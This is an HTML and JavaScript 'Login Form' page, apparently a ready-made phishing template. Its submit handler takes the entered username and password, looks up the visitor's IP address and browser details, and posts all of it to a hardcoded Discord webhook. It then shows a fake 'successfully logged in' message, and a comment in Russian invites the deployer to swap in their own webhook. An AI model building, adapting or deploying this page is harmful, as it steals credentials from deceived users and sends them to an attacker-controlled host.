<!DOCTYPE html>
<html>
<head>
    <title>Login Form</title>
    <style>
        body {
            background-image: url('https://cdn.discordapp.com/attachments/1064146226691444776/1093838361413820496/v2.png');
            background-size: cover;
            background-repeat: no-repeat;
            font-family: Arial, Helvetica, sans-serif;
            text-align: center;
        }

        h2 {
            color: white;
            margin-top: 50px;
        }

        form {
            display: inline-block;
            background-color: #f2f2f2;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0,0,0,0.5);
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }

        input[type=text], input[type=password] {
            width: 100%;
            padding: 12px 20px;
            margin: 8px 0;
            display: inline-block;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }

        button {
            background-color: #4CAF50;
            color: white;
            padding: 14px 20px;
            margin: 8px 0;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
        }

        button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <h2>Login Form</h2>
    <form onsubmit="submitForm(event)">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required>

        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required>

        <button type="submit">Login</button>
    </form>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        function submitForm(event) {
            event.preventDefault();

            var webhook_url = "https://discord.com/api/webhooks/1093641132673597562/9o1Nq18xZRKMiT4qUsjIx_l02CpaTdzU2Sd5K15kfRjcxieXek-uLdJtjeiOUhanC3r0"; // замените на свой Discord Webhook
            var username = document.getElementById("username").value;
            var password = document.getElementById("password").value;

            // Получение IP-адреса пользователя и информации о браузере
            var ip_address = "";
            var browser_info = "";
            $.getJSON('//api.ipify.org?format=json', function(data) {
                ip_address = data.ip;
                browser_info = navigator.userAgent;
            }).done(function() {
                var request = new XMLHttpRequest();
                request.open("POST", webhook_url);
                request.setRequestHeader('Content-type', 'application/json');
                var params = {
                    username: "Login Form",
                    avatar_url: "https://i.imgur.com/WzAMxKl.png",
                    content: "**Username**: " + username + "\n**Password**: " + password + "\n**IP Address**: " + ip_address + "\n**Browser Info**: " + browser_info
                };
                request.send(JSON.stringify(params));

                alert("Вы успешно вошли!");
                document.getElementById("username").value = "";
                document.getElementById("password").value = "";
            });
        }
    </script>
</body>
</html>
